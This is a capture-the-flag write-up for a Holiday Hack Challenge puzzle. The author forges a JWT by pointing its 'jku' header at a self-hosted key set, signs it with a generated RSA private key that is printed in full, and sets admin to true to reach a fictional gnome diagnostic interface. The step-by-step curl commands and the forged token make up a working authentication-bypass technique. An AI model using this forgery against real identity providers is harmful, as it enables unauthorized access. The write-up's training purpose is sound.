# Rogue Gnome Identity Provider

## Objective

Difficulty: ❄️❄️  
[Hints](./docs/HHC_2025/neighborhood/hints/hint-rogue_gnome.md) and [Conversations](./docs/HHC_2025/neighborhood/hints/chat-paul_beckett.md)

Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?

## Solution

> refrigeration-botnet.bin

## Challenge

```bash
Hi, Paul here. Welcome to my web-server. I've been using it for JWT analysis.

I've discovered the Gnomes have a diagnostic interface that authenticates to an Atnas identity provider.

Unfortunately the gnome:SittingOnAShelf credentials discovered in 2015 don't have sufficient access to view the gnome diagnostic interface.

I've kept some notes in ~/notes

Can you help me gain access to the Gnome diagnostic interface and discover the name of the file the Gnome downloaded? When you identify the filename, enter it in the badge.
```

ls to see what's available

```bash
paul@paulweb:~$ ls
notes  www  www-logs
```

read notes

```bash
paul@paulweb:~$ cat  notes
# Sites

## Captured Gnome:
curl http://gnome-48371.atnascorp/

## ATNAS Identity Provider (IdP):
curl http://idp.atnascorp/

## My CyberChef website:
curl http://paulweb.neighborhood/

### My CyberChef site html files:
~/www/


# Credentials

## Gnome credentials (found on a post-it):
Gnome:SittingOnAShelf


# Curl Commands Used in Analysis of Gnome:

## Gnome Diagnostic Interface authentication required page:
curl http://gnome-48371.atnascorp

## Request IDP Login Page
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

## Authenticate to IDP
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login

## Pass Auth Token to Gnome
curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

## Access Gnome Diagnostic Interface
curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnostic-interface

## Analyze the JWT
jwt_tool.py <insert-JWT>
```

ls www

```bash
paul@paulweb:~$ ls www 
ChefWorker.js.LICENSE.txt  DishWorker.js.LICENSE.txt   LoaderWorker.js.LICENSE.txt  assets  index.html     modules
CyberChef_v10.19.4.html    InputWorker.js.LICENSE.txt  ZipWorker.js.LICENSE.txt     images  index.html.br
```

looking around

```bash
paul@paulweb:~$ curl http://idp.atnascorp/.well-known/jwks.json
{
  "keys": [
    {
      "e": "AQAB",
      "kid": "idp-key-2025",
      "kty": "RSA",
      "n": "7WWfvxwIZ44wIZqPFP9EEemmwMhKgBakYPx736W5gGD8YJlmMzanxdi8NANJ6kyMN-ErFOKJuIQn01PmAeq7On4OCwLyQpB5dHXiidZPRjb2lbrrL1k32svdeo6VGCnzdrGu6KtDHxHn8m9H3WqGVmi2OmCZsk6fJbnoklnJaFiygUkC4IMbk92cbYvajPTqV9C6yWCROPagxQFmybq1hNJoY-FRntEKwBN89Dow8d-PsGMten3CmzDQ9o8rXKs6euk9xLfX06og5Wm1aKJk686WzhtqgdmBjqt2w34EJGlEL0ZSvPdB9nPqxao83N-ah-IYeoiCnSUBKjXI-IRSjQ",
      "use": "sig"
    }
  ]
}
paul@paulweb:~$ ls -la .jwt_tool/ 
total 36
drwxrwxr-x 1 paul counterhack 4096 Sep 16 07:33 .
drwx--x--x 1 paul counterhack 4096 Oct 30 15:54 ..
-rw-rw-r-- 1 paul counterhack 2189 Sep 13 08:24 jwtconf.ini
-rw-rw-r-- 1 paul counterhack  507 Sep 13 08:24 jwttool_custom_jwks.json
-rw-rw-r-- 1 paul counterhack  240 Sep 13 08:24 jwttool_custom_private_EC.pem
-rw-rw-r-- 1 paul counterhack 1678 Sep 13 08:24 jwttool_custom_private_RSA.pem
-rw-rw-r-- 1 paul counterhack  177 Sep 13 08:24 jwttool_custom_public_EC.pem
-rw-rw-r-- 1 paul counterhack  450 Sep 13 08:24 jwttool_custom_public_RSA.pem
paul@paulweb:~$ cat .jwt_tool/jwttool_custom_jwks.json 
{
    "keys":[
        {
            "kty":"RSA",
            "kid":"jwt_tool",
            "use":"sig",
            "e":"AQAB",
            "n":"tchOVdXUg9T_HV2f9TVZeoH3G2uB243yAa6Hh7RsyeOy1tAs-OEnD1_5TWrljY-RqoSfoEjbE38rtVLp_weDfroHn8I-I9lGuAA-wDI70sOTm4tSSDuwD9VBFmXI-dFwsTN446yRJagaZP4ZgfPoreOL9bpfL_7HxPOJZ14z2ZJZaP-7hr1HSasyTkkRG3u4pylgoRUu2ZUxWhqNg1A7e1YNUrtlqagooFxGYkZBXbBXJbHdMLn-PSs3tc3pWQEQHPAYBSFHnCzyTEOFQOixh-OQq3KyL5sHKvOWUhTyO2USOmJHLYUbCEd6_DfrcR4P5EctwTlTEU1ssXONGgxHAQ"
        }
    ]
}paul@paulweb:~$ 
```

testing that I can create files and directories in the www directory

```bash
paul@paulweb:~$ cd www
paul@paulweb:~/www$ mkdir tmp
paul@paulweb:~/www$ cd tmp/
paul@paulweb:~/www/tmp$ echo "hello world" > tmpTest.txt
paul@paulweb:~/www/tmp$ 
paul@paulweb:~/www/tmp$ 
paul@paulweb:~/www/tmp$ curl http://paulweb.neighborhood/tmp/tmpTest.txt | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    12  100    12    0     0  11583      0 --:--:-- --:--:-- --:--:-- 12000
hello world
paul@paulweb:~/www/tmp$ 
```

from the authenticate step

```bash
paul@paulweb:~$ curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzkwODAyMiwiZXhwIjoxNzYzOTE1MjIyLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.Pzd8qxvVWq9p2HQfyJEFghPxquDiMwRJitfCce1X-Fe_eZXXoesfcjprwHhmQ5vCYdbfzO43wtSsbyCPJX9KzAxLEYTMuTcVb5v-NaHoqMTNSlptWmSjZDC3GZL06cZ-UHUKIAOCkfpYk7uJIkYUJiqq2iXUTkGUsbYZL2tkHw5zHFLir9ejZ-ibGe2N2O_UlMGbe6uFHlYjXxI9j6LTNFNDb_dlYdY_ylrbRUb18FNBbUBbgZg0mqBOhlqcrHTFrgaT5ixBfKm2IQB6fxwSsEDbEssBh2ad50iMPoDqhcwOLode79iGNlmLr5YdZ2A-4WTa7M34e2ysvuMfsZu9ug">http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzkwODAyMiwiZXhwIjoxNzYzOTE1MjIyLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.Pzd8qxvVWq9p2HQfyJEFghPxquDiMwRJitfCce1X-Fe_eZXXoesfcjprwHhmQ5vCYdbfzO43wtSsbyCPJX9KzAxLEYTMuTcVb5v-NaHoqMTNSlptWmSjZDC3GZL06cZ-UHUKIAOCkfpYk7uJIkYUJiqq2iXUTkGUsbYZL2tkHw5zHFLir9ejZ-ibGe2N2O_UlMGbe6uFHlYjXxI9j6LTNFNDb_dlYdY_ylrbRUb18FNBbUBbgZg0mqBOhlqcrHTFrgaT5ixBfKm2IQB6fxwSsEDbEssBh2ad50iMPoDqhcwOLode79iGNlmLr5YdZ2A-4WTa7M34e2ysvuMfsZu9ug</a>. If not, click the link.
```

Generate new pub/priv keys

![new_pub_priv_keys](new_pub_priv_keys.png)

Convert JWK to Public and Private Keypair

```bash
# Public
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAgQNe2N2avj9C6TdwbzLk
ZYbkvbuaE4NILsPvWhdFyrMXCINanAqMdRxEKdQ1rgo+nwFSawxHCcof3g/FqTR5
wQmXqQyK216nNzi9Gm3TpA86HIqaXIqYLMCXXg10jK8q/8hMeG7ntdpDGnlsTSo5
/bnDi+Ya8zbJ4/fnGQqewl7SIF6i0QwRJWm9lc8QVaeMeI0sCZ7lQIkiwP21L7Jb
s2rKCYkBugYzj2y2k7uXVv4PzyO995xnHqb6zJv+LRn8KezQCo8/oIlSPluZvbrD
8K8JXKsnpd7zvZAHCaKmlO0mhWZ6SFTuTr+00g6XgrLZhipjndJ7DFrsW04ezCqE
MwIDAQAB
-----END PUBLIC KEY-----

# Private
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAgQNe2N2avj9C6TdwbzLkZYbkvbuaE4NILsPvWhdFyrMXCINa
nAqMdRxEKdQ1rgo+nwFSawxHCcof3g/FqTR5wQmXqQyK216nNzi9Gm3TpA86HIqa
XIqYLMCXXg10jK8q/8hMeG7ntdpDGnlsTSo5/bnDi+Ya8zbJ4/fnGQqewl7SIF6i
0QwRJWm9lc8QVaeMeI0sCZ7lQIkiwP21L7Jbs2rKCYkBugYzj2y2k7uXVv4PzyO9
95xnHqb6zJv+LRn8KezQCo8/oIlSPluZvbrD8K8JXKsnpd7zvZAHCaKmlO0mhWZ6
SFTuTr+00g6XgrLZhipjndJ7DFrsW04ezCqEMwIDAQABAoIBAE1atwDzBnhxt+3b
5tdVvWo+kmJM3No8Sgh4RMhQ0fDypqndEHQlQwho9VnbOoBq9hcilMdIqkNtZOQh
stN8elBLLxsWQR+9RievJnt1RIPG+YHpfRplo06Z/2hOSwabdP2+nFNNtDLudnOm
QFCYNAM04dG9G4We4TiGCJOUMZK6q78NrCL+G2I0T1XuQ/F37PXMrjCyFvmpTX0M
VTtYKpm60zcBARaAm/vwWLaCwyXJd624Likup/CUbZIkDi8+Akqc4kTjH7+rxVj7
ktxUaVZA/EjpH1bl0/ZTzj3ODdM/YengolmYK+LYLpNyKXNR8Tw9RNPn6ui1UGKg
3kFqpTECgYEAvfkP34igmyVZL/bXF7lkaeqy2k9j9wZBrKvjQn7ebRS3juvABuDL
pdHiwvSnlTzQ0fMAikfCtsFZm9/GbA8dzY5HbOM9VdXMbFCHX0lQm7ZhiCSLva9N
a5SG9b3RsMmMss9ozTr7Q0d/msIe+WFhB3X4bD+QZTrWSauu92mlzVsCgYEArdpi
aQkEEyLCEnaSo/BgQOHleQJn9pMjuE9SKTSjwwlTUe6wIA7UAdZltJdmjaIXa6Nr
nW05dL7q/viaO0x0PYKGE+2l7/MlXP0xBR5WzBjn2befJgAZPI+vOx+1fvz3XD4p
Atgo68ka5JWg36qIQuYZgK+/Sc8lL6rMkBvYpAkCgYAfEAaEana4Z5b5vMbW3j2J
BBNSlwCld6Rtc32pdc0w0N5ixDGV7lPePT9y2UY9pMAQVEeWVL2F3H+meSScrqwU
3FrZdx6kVl0iqNg5wGcpztyLwk4HKg7itFqM/Ai5e3tCEZ/1Ttue2KYIzAz8geu3
qJaCPLKDmudHDIeDdQbjWQKBgF7JCQyBKOKR+cN9ODf/b0sQnj7ai/oIgNoVDROA
KqTEadPq0cW4r+gMj0jlnrkrnZ9G6v5atY+sI40910DrTxjWF+m3kNgA9eb7+AT1
ZJdEIOw3y6I5PYkiQYR3pkmE/Awjq9JsLetXqrzjw2EOpdnrgA4EQ8OnF3wkoAEV
3YiZAoGAKIBF4GeomdOsI/IXVbvMBHQoCsr5orz1d3PMO1OVImkIun22Vz5aSuT/
+5NY7doVkkf/WUYlkwt92Z8AXbRSNStVOU27ecxUMgDag3sdTebmer1GGgyX46PS
NgWp39MYO7ge3YDDxnbl74ZXZoIfQuneT0Xr9cd5fIB4H3Jo14M=
-----END RSA PRIVATE KEY-----
```

Use [JWT.rocks](jwt.rocks) to tamper the encoded token by modifying on the right hand side.  Be sure to replace the pub/priv keys as well. 

![alt text](tampered_jwt.png) 

Validate new token using [JWT.io](jwt.io).  If it doesn't say valid JWT and signature verified - try harder!

![alt text](tampered_jwt_verified.png) 

Tampered JWT Text

```bash
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC90bXAvandrcy5qc29uIiwia2lkIjoiand0X3Rvb2wiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzkwODAyMiwiZXhwIjoxNzYzOTE1MjIyLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.H7eKNIKgtUDWgppLyCGUK225l2t0WnZ9nc__-eEKU1G0HJRZtbcBZeyEqpfSOJO0L7QC-eLgF5pXNWQ9MsGh-0RIMN50-eT_ERGtjQHKEF485TTePS5J_1OmGXEIxab_iCGo4reYFt4tOdYpeADauvy6kLnF5VIe--HpuFfJ6Bj9amo0uzXP2atdgtxpJaCer2uDCbd9UeWa4PHwfIpfGf3XS4qyvSVxrqPfwW0v_ecD7A1Y5xk4LEtB30H_oIRV0uwtnk88JQBDxkSF59bzyP1UZbAzfbFpiZUfvmIjvalz58j6m5pkBZGaBIAkACyFum2xeKdO7QPXXhimum6EWg
```

Create the new hosted keys.  A key example already exists, so copy that then modify the n value.

```bash
# Copy existing example
paul@paulweb:~$ cp .jwt_tool/jwttool_custom_jwks.json www/tmp/

# Rename to match url in tampered JWT
paul@paulweb:~/www/tmp$ mv jwttool_custom_jwks.json jwks.json

# Use nano to modify
paul@paulweb:~/www/tmp$ nano jwks.json 

# Verify changes
paul@paulweb:~/www/tmp$ cat jwks.json 
{
    "keys":[
        {
            "kty":"RSA",
            "kid":"jwt_tool",
            "use":"sig",
            "e":"AQAB",
            "n":"gQNe2N2avj9C6TdwbzLkZYbkvbuaE4NILsPvWhdFyrMXCINanAqMdRxEKdQ1rgo-nwFSawxHCcof3g_FqTR5wQmXqQyK216nNzi9Gm3TpA86HIqaXIqYLMCXXg10jK8q_8hMeG7ntdpDGnlsTSo5_bnDi-Ya8zbJ4_fnGQqewl7SIF6i0QwRJWm9lc8QVaeMeI0sCZ7lQIkiwP21L7Jbs2rKCYkBugYzj2y2k7uXVv4PzyO995xnHqb6zJv-LRn8KezQCo8_oIlSPluZvbrD8K8JXKsnpd7zvZAHCaKmlO0mhWZ6SFTuTr-00g6XgrLZhipjndJ7DFrsW04ezCqEMw"
        }
    ]
}
```

Confirm keys were hosted

```bash
paul@paulweb:~$ curl http://paulweb.neighborhood/tmp/jwks.json
{
        "keys": [
        {
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "jwt_tool",
    "alg": "RS256",
    "n": "gQNe2N2avj9C6TdwbzLkZYbkvbuaE4NILsPvWhdFyrMXCINanAqMdRxEKdQ1rgo-nwFSawxHCcof3g_FqTR5wQmXqQyK216nNzi9Gm3TpA86HIqaXIqYLMCXXg10jK8q_8hMeG7ntdpDGnlsTSo5_bnDi-Ya8zbJ4_fnGQqewl7SIF6i0QwRJWm9lc8QVaeMeI0sCZ7lQIkiwP21L7Jbs2rKCYkBugYzj2y2k7uXVv4PzyO995xnHqb6zJv-LRn8KezQCo8_oIlSPluZvbrD8K8JXKsnpd7zvZAHCaKmlO0mhWZ6SFTuTr-00g6XgrLZhipjndJ7DFrsW04ezCqEMw"
}
]
}
```

Tamper JWJS token

from the pass the token step

```bash
curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC90bXAvandrcy5qc29uIiwia2lkIjoiand0X3Rvb2wiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzkwODAyMiwiZXhwIjoxNzYzOTE1MjIyLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.H7eKNIKgtUDWgppLyCGUK225l2t0WnZ9nc__-eEKU1G0HJRZtbcBZeyEqpfSOJO0L7QC-eLgF5pXNWQ9MsGh-0RIMN50-eT_ERGtjQHKEF485TTePS5J_1OmGXEIxab_iCGo4reYFt4tOdYpeADauvy6kLnF5VIe--HpuFfJ6Bj9amo0uzXP2atdgtxpJaCer2uDCbd9UeWa4PHwfIpfGf3XS4qyvSVxrqPfwW0v_ecD7A1Y5xk4LEtB30H_oIRV0uwtnk88JQBDxkSF59bzyP1UZbAzfbFpiZUfvmIjvalz58j6m5pkBZGaBIAkACyFum2xeKdO7QPXXhimum6EWg

* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
> GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC90bXAvandrcy5qc29uIiwia2lkIjoiand0X3Rvb2wiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzkwODAyMiwiZXhwIjoxNzYzOTE1MjIyLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.H7eKNIKgtUDWgppLyCGUK225l2t0WnZ9nc__-eEKU1G0HJRZtbcBZeyEqpfSOJO0L7QC-eLgF5pXNWQ9MsGh-0RIMN50-eT_ERGtjQHKEF485TTePS5J_1OmGXEIxab_iCGo4reYFt4tOdYpeADauvy6kLnF5VIe--HpuFfJ6Bj9amo0uzXP2atdgtxpJaCer2uDCbd9UeWa4PHwfIpfGf3XS4qyvSVxrqPfwW0v_ecD7A1Y5xk4LEtB30H_oIRV0uwtnk88JQBDxkSF59bzyP1UZbAzfbFpiZUfvmIjvalz58j6m5pkBZGaBIAkACyFum2xeKdO7QPXXhimum6EWg HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 302 FOUND
< Date: Sun, 23 Nov 2025 15:13:38 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 229
< Location: /diagnostic-interface
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aSMkog.Wbq_uUa1ZG50BaxShAxMc2k9ZZw; HttpOnly; Path=/
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact
```

Set the cookie

```bash
paul@paulweb:~$ curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aSMohg.5YNgbU1sKvn_VZexoJ0GL1HpRuw' http://gnome-48371.atnascorp/diagnostic-interface

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<div style='display:flex; justify-content:center; gap:10px;'>
<img src='/camera-feed' style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0;' />
<div style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0; display:flex; align-items:flex-start; justify-content:flex-start; text-align:left;'>
System Log<br/>
2025-11-23 05:46:36: Movement detected.<br/>
2025-11-23 12:35:12: AtnasCorp C&C connection restored.<br/>
2025-11-23 14:03:00: Checking for updates.<br/>
2025-11-23 14:03:00: Firmware Update available: refrigeration-botnet.bin<br/>
2025-11-23 14:03:02: Firmware update downloaded.<br/>
2025-11-23 14:03:02: Gnome will reboot to apply firmware update in one hour.</div>
</div>
<div class="statuscheck">
    <div class="status-container">
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Live Camera Feed</span>
        </div>
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Network Connection</span>
        </div>
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Connectivity to Atnas C&C</span>
        </div>
    </div>
</div>

</body>
</html>paul@paulweb:~$ 
```

Go back to the ojective and enter the answer.
> refrigeration-botnet.bin  

## Resources

* [Tamper JWKS](https://jwt.rocks/)
* [Validate JWKS](https://www.jwt.io/)
* [Generate JWKS Web Token](https://mkjwk.org/)
* [JWK to PEM Convertor online](https://8gwifi.org/jwkconvertfunctions.jsp)
* [CyberChef](https://gchq.github.io/)
* [JWKS Tamper Walk-Thru](https://www.youtube.com/watch?v=KUyuvnez0ks)
  
## Game Location

![alt text](./docs/HHC_2025/neighborhood/Park/rogue_gnome.png) 
